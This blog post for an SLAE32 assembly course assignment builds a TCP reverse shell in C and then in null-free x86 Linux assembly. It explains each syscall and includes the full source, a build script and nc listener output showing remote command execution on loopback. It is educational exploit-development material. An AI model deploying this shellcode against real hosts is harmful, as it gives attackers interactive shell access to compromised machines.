## Introduction

This is the blog post for the 2<sup>nd</sup> Assignment of the SLAE32 course, which is offered by <a href="https://www.pentesteracademy.com/course?id=3" target="_blank">PentesterAcademy</a>. The course focuses on teaching the basics of 32-bit Assembly language for the Intel Architecture (IA-32) family of processors on the Linux platform.

The purpose of this assignment is to create a TCP Reverse Shell. A Reverse Shell has a listener running on the attacker and the target connects back to the attacker with a shell. The communication happens over the TCP protocol.

My code can be found in my Github: <a href="https://github.com/geobour98/slae32" target="_blank">geobour98's Github</a>.

## TCP Reverse Shell in C

The easiest way, in my opinion, to create a TCP Reverse Shell in `Assembly` is to first create it in `C` and then "translate" it to ASM code.

In order create the TCP Reverse Shell, a few Linux system calls (`syscalls`) will be used. They can be found in the following table:

| Syscall | Usage |
| -- | -- |
| `socket` | Creates an endpoint for communication |
| `connect` | Initializes a connection on a socket |
| `dup2` | Duplicates a file descriptor |
| `execve` | Executes a program |

Create a socket:

```c
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
```

Initialize the connection on a socket, initializing the structure for the TCP/IP address first:

```c
struct sockaddr_in address = {
	.sin_family = AF_INET,
	.sin_port = htons(4444),
	.sin_addr = inet_addr("127.1.1.1")
};

connect(sockfd, (struct sockaddr*) &address, sizeof(address));
```

Duplicate STDIN, STDOUT and STDERR file descriptors in order to redirect everything to the socket connected:

```c
dup2(sockfd, 0);
dup2(sockfd, 1);
dup2(sockfd, 2);
```

Execute the `/bin/sh` program:

```c
execve("/bin/sh", NULL, NULL);
```

The whole `C` program is the following:

```c
// TCP Reverse Shell
// Author: geobour98

#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>

int main()
{
	
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in address = {
		.sin_family = AF_INET,
		.sin_port = htons(4444),
		.sin_addr = inet_addr("127.1.1.1")
	};

	connect(sockfd, (struct sockaddr*) &address, sizeof(address));

	dup2(sockfd, 0);
	dup2(sockfd, 1);
	dup2(sockfd, 2);

	execve("/bin/sh", NULL, NULL);
	
	return 0;
}
```

In order to prove that the Reverse Shell is working we have to compile the `C` program using the GNU Compiler (`gcc`):

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ gcc reverse-c.c -o reverse-c
```

First, create a listener with `nc` on port `4444` and wait for connections:

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ nc -lvnp 4444
```

Then, in another terminal execute `reverse-c`.

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ ./reverse-c

```

In the first terminal verify the incoming connection and run the commands `id` and `ls`.

```shell
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 35304)
id
uid=1000(geobour98) gid=1000(geobour98) groups=1000(geobour98),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
ls
compile.sh
reverse
reverse-c
reverse-c.c
reverse.nasm
reverse.o
reverse.py
exit
geobour98@slae32-dev:~$
```

## TCP Reverse Shell in Assembly

In order to implement the syscalls in Assembly, we have to find their defined numbers. These are located at the header file: `/usr/include/i386-linux-gnu/asm/unistd_32.h`.

The syscalls and their definitions can be found in the following table:

| Syscall | Definition |
| -- | -- |
| `socket` | `#define __NR_socket 359` |
| `connect` | `#define __NR_connect 362` |
| `dup2` | `#define __NR_dup2 63` |
| `execve` | `#define __NR_execve 11` |

Now we have to find the arguments and their values in order to be used in the syscalls.

- Syscall `socket`:

```shell
int socket(int domain, int type, int protocol);
```

The `domain` argument specifies a communication domain. Since we operate through IPv4 protocol, we will use the `AF_INET` address family, which according to the socket header file: `/usr/include/i386-linux-gnu/bits/socket.h` belongs to the `PF_INET` protocol family. This protocol family is represented by the number `2`.

The `type` argument specifies the communication semantics. We will use `SOCK_STREAM`, since it provides sequenced, reliable, two-way, connection-based byte streams. According to the socket_type header file: `/usr/include/i386-linux-gnu/bits/socket_type.h`, `SOCK_STREAM` is represented by the number `1`.

The `protocol` argument specifies a particular protocol to be used with the socket. Normally only a single protocol exists to support a particular socket type within a given protocol family, in which case `protocol` can be specified as `0`.

The return value from `socket` is a file descriptor for the new socket, if socket was executed successfully.

- Syscall `connect`:

```shell
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```   

The `sockfd` argument is the file descriptor returned from `socket` execution. It is an integer value.

The `*addr` argument is the address structure that will be assigned to the socket. The structure consists of 3 values. The first value is the `AF_INET`, which from before is the number `2`. The second value is the port that the target will be connected to, which in our case is `4444`. The third value is the interface that the socket will connect to. We provide the value `127.1.1.1` in order to connect to the loopback interface (`127.0.0.0/8`). Note that we avoid addresses like `127.0.0.1` (that contain `0`), so we don't have nullbytes in the shellcode.

The `addrlen` argument is the size, in bytes, of the address structure pointed to by `addr`. According to the header file: `/usr/include/linux/in.h` the size is `16` bytes.

- Syscall `dup2`:

```shell
int dup2(int oldfd, int newfd);
```

The argument `oldfd` is the integer returned from `socket`.

If the descriptor `newfd` was previously open, it is silently closed before being reused. If `oldfd` is a valid file descriptor, and `newfd` has the same value as `oldfd`, then `dup2` does nothing, and returns `newfd`. We execute `dup2` 3 times in order to pass the values: `0` for `STDIN`, `1` for `STDOUT` and `2` for `STDERR`.

On success `dup2` returns the new descriptor.

- Syscall `execve`:

```shell
int execve(const char *filename, char *const argv[], char *const envp[]);
```

The `*filename` argument must be either a binary executable or a script, so we pass to it the executable "bin/sh".

The `argv` argument is an array of argument strings passed to the new program. The `envp` argument is an array of strings, conventionally of the form "key=value", which are passed as environment to the new program. Since we don't need any of these we pass the value `NULL`. 


### Assembly in Detail

Now we will examine the `Assembly` instructions in detail.

- Syscall `socket`

We first clear the register `EAX` and then pass the hexadecimal value `0x167`, which in decimal is 359. That value is passed to the `AX` part of the `EAX` register, which contains the 16 less significant bits. The decimal 359 needs 9 bits in order to be represented in binary and since we must use registers with integer size multiple to 8, we need 16 bits. If we reserved the whole `EAX` register, then nullbytes (`0x00`) would be put in the 16 more significant bits that would break our shellcode.

```nasm
	xor eax, eax
	mov ax, 0x167		; 167 is the hex value of the decimal 359 for socket
```

Then we clear the `EBX` register and pass to `BL` the value `2`, since there is the `PF_INET` protocol family.

```nasm
	xor ebx, ebx
	mov bl, 0x2		; AF_INET numeric value from PF_INET protocol family
```

After that, we clear the `ECX` register and pass to `CL` the value `1`, since this is the value of `SOCK_STREAM` constant.

```nasm
	xor ecx, ecx
	mov cl, 0x1		; SOCK_STREAM constant from socket_type.h
```

We clear the `EDX` register and the value `0`, because of the single protocol, is passed as the third argument to `socket` syscall.

```nasm
	xor edx, edx		; 0 value because of single protocol
```

Then, in order to actually execute the syscall, we run the following instruction:

```nasm
	int 0x80		; exec socket syscall
```

That instruction will be invoked after declaring the arguments of each syscall in order to be executed.

The `socket` syscall returns a file descriptor (`sockfd`), so we copy it to the `EBX` register, since the result of the syscall is saved in the `EAX` register by default.

```nasm
	mov ebx, eax		; move sockfd (file descriptor) value into ebx
```

- Syscall `connect`

We clear the `EAX` register and then pass the hexadecimal value `0x16a`, which in decimal is 362. Note that these values come from the table with the `syscalls` and their `definitions` from above.

```nasm
	xor eax, eax
	mov ax, 0x16a		; 16a is the hex value of the decimal 362 for connect
```

> **Stack vs Registers**
>
> When we use the stack, as we will for the following arguments, we push the arguments from last to first, since it is Last In First Out data structure. Thatâ€™s not the case with registers, since each argument needs to be stored in a specific register.
{: .prompt-warning }
<!-- markdownlint-restore -->

We start with the values for the `address` structure.

We push the hexadecimal value `0x0101017f` to the stack, which is the address `127.1.1.1` in little endian representation, so the socket connects to the loopback interface (`127.0.0.0/8`).

```nasm
	push 0x0101017f		; connect to localhost (127.1.1.1) (little endian)
```

Then, since we are dealing with little endianness the port with decimal value `4444` and hexadecimal `115c`, becomes `5c11`.

```nasm
	push word 0x5c11	; listen on port 4444 (little endian)
```

After that, we push the value `2` for the `AF_INET` constant.

```nasm
	push word 0x2		; AF_INET constant
```

We clear the `ECX` register, and save the value of the Stack Pointer (`ESP` register) there. So now `ECX` points at the top of the stack.

```nasm
	xor ecx, ecx
	mov ecx, esp		; ecx now points at address struct at the top of the stack
```

Now the values for the struct are defined.

The `EBX` register already contains the value of `sockfd` from `socket`.

The `ECX` register already points at the beginning of the struct in the stack.

We clear the `EDX` register, and pass the hexadecimal value `0x10` (`16` in decimal), since that is the size of the address struct.

```nasm
	xor edx, edx
	mov dl, 0x10		; 10 is the decimal 16 that is the size of the address struct
```

The final step for the `connect` syscall is to invoke a syscall interrupt by the next instruction:

```nasm
	int 0x80		; exec connect syscall
```

- Syscall `dup2`

We create a loop that will execute `dup2` 3 times for `STDERR`, `STDOUT` and `STDIN` respectively. So, we clear the `ECX` register and pass the value `0x3` to `CL`, which is the counter for the loop.

```nasm
	xor ecx, ecx
	mov cl, 0x3		; set counter to 3
```

We first declare the procedure `dup2loop`, which acts like a function, where we clear the `EAX` register and pass to `AL` the hexadecimal value `0x3f` (`63` in decimal) as the `dup2` syscall number. Then, we decrement the counter (`CL`) by 1, so in the first iteration the value inside `CL` will be `2`, representing the `STDERR`. 2 more iterations will happen with value `1` and `0` for `STDOUT` and `STDIN` respectively. Each iteration is finished by executing the `dup2` syscall and by creating a conditional instruction. That instruction checks if the Zero Flag (`ZF`) is set, meaning it has value `0`, and if it is the loop is stopped and the execution is continued. If it is not `0` a `jump` happens back to `dup2loop`. In the third iteration, `CL` is decremented to `0`, so the `ZF` is set, and the execution will continue to the next instructions and there will not be a jump back to `dup2loop`.

```nasm
dup2loop:
	xor eax, eax
	mov al, 0x3f		; 3f is the hex value of the decimal 63 for dup2

	dec cl			; decrement counter by 1

	int 0x80		; exec dup2 syscall

	jnz dup2loop		; jump to loop if ZF is not zero, else continue
```

- Syscall `execve`

We clear the `EAX` register and pass the hexadecimal value `0xb` (`11` in decimal) to `AL` as the `execve` syscall number.

```nasm
	xor eax, eax
	mov al, 0xb		; b is the hex value of the decimal 11 for execve
```

Then we clear the `EDX` register. The last 2 arguments of `execve` have `NULL` values, so we push the `EDX` value to the stack twice. Also, the executable "/bin/sh" must be null terminated, so we push one more time the `EDX` value to the stack.

```nasm
	xor edx, edx
	push edx		; NULL argument
	push edx		; NULL argument
	push edx		; null terminator
```

Since "/bin/sh" is only 7 bytes, we need to make it 8 bytes. That is because when a string is pushed to the stack it must be multiplied by 4. The safest way to do that, without breaking any functionality, is to add a `/`. So the string `/bin/sh` becomes `/bin//sh`. The following string would be valid too `//bin/sh`. Since we are dealing with the stack again, the string must be reversed first. The next `python` script will help achieve that.

```python
#!/usr/bin/python

import sys

input = sys.argv[1]

print 'String length: ' + str(len(input))

stringList = [input[i:i+4] for i in range(0, len(input), 4)]

for item in stringList[::-1]:
	print item[::-1] + ' : ' + str(item[::-1].encode('hex'))
```

We run the above script by providing the string we want to be reversed.

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ ./reverse.py "/bin//sh"
String length: 8
hs// : 68732f2f
nib/ : 6e69622f
```

Now the string is represented as `hex` and we can push it to the stack. So we push first the string "hs//" and then the string "nib/".

```nasm
        ; PUSH /bin//sh
        push 0x68732f2f		; "hs//"
        push 0x6e69622f		; "nib/"
```

Finally, we save `ESP` value to the `EBX` register in order to point at the top of the stack and execute the `execve` syscall.

```nasm
	mov ebx, esp		; ebx points at "/bin//sh" at the top of the stack

	int 0x80		; exec execve syscall
```

The whole `Assembly` program is the following:

```nasm
; TCP Reverse Shell
; Author: geobour98 

global _start

section .text

_start:
	; socket 
	xor eax, eax
	mov ax, 0x167		; 167 is the hex value of the decimal 359 for socket

	xor ebx, ebx
	mov bl, 0x2		; AF_INET numeric value from PF_INET protocol family

	xor ecx, ecx
	mov cl, 0x1		; SOCK_STREAM constant from socket_type.h

	xor edx, edx		; 0 value because of single protocol	

	int 0x80		; exec socket syscall 

	mov ebx, eax		; move sockfd (file descriptor) value into ebx

	; connect
	xor eax, eax
	mov ax, 0x16a		; 16a is the hex value of the decimal 362 for connect

	push 0x0101017f		; connect to localhost (127.1.1.1) (little endian)
	
	push word 0x5c11	; connect to port 4444 (little endian)
	
	push word 0x2		; AF_INET constant
	
	xor ecx, ecx
	mov ecx, esp		; ecx now points at address struct at the top of the stack
	
	xor edx, edx
	mov dl, 0x10		; 10 is the decimal 16 that is the size of the address struct

	int 0x80		; execute connect syscall

	; dup2 loop
	xor ecx, ecx		; clear ecx
	mov cl, 0x3		; set counter to 3

dup2loop:
	xor eax, eax
	mov al, 0x3f		; 3f is the hex value of the decimal 63 for dup2

	dec cl			; decrement counter by 1

	int 0x80		; exec dup2 syscall

	jnz dup2loop		; jump to loop if ZF is not zero, else continue

	; execve
	xor eax, eax
	mov al, 0xb		; b is the hex value of the decimal 11 for execve        

	xor edx, edx
	push edx		; NULL argument
	push edx		; NULL argument
	push edx		; null terminator

        ; PUSH /bin//sh
        push 0x68732f2f		; "hs//"
        push 0x6e69622f		; "nib/"

	mov ebx, esp		; ebx points at "/bin//sh" at the top of the stack

	int 0x80		; exec execve syscall
```

## Testing the Reverse Shell

In order to test Reverse Shell, we need to compile it. Compilation process consists of 2 separate processes:

- Assembling: can happen with the `nasm` assembler, which assembles the input file (`.nasm`) and directs output to the output file (`.o`) if specified. It basically "translates" the `Assembly` code.
- Linking: can happen with the GNU linker `ld`, which combines a number of object and archive files, relocates their data and ties up symbol references. It basically provides information such as where the entry point of a program is. By default the entry point is `_start` but this can be changed.

The following `bash` script automates that process:

```bash
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -felf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -o $1 $1.o

echo '[+] Done!'
```

The following command does the compilation and creates the executable `reverse`:

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ ./compile.sh reverse
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
```

We test the Reverse Shell by creating a listener on port `4444` with `nc` in one terminal window and in another we execute the executable `reverse`. Then, back to the first we verify the incoming connection and run the commands `id` and `ls`.

1<sup>st</sup> window:

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ nc -lvnp 4444
```

2<sup>nd</sup> window:

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ ./reverse

```

1<sup>st</sup> window again:

```shell
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 35306)

ls
compile.sh
reverse
reverse-c
reverse-c.c
reverse.nasm
reverse.o
reverse.py
exit
geobour98@slae32-dev:~$
```

## Summary

We have a working TCP Reverse Shell that connects to loopback interface on port 4444 on our machine and we can execute commands after connecting.

Next will be the Egg Hunter shellcode!
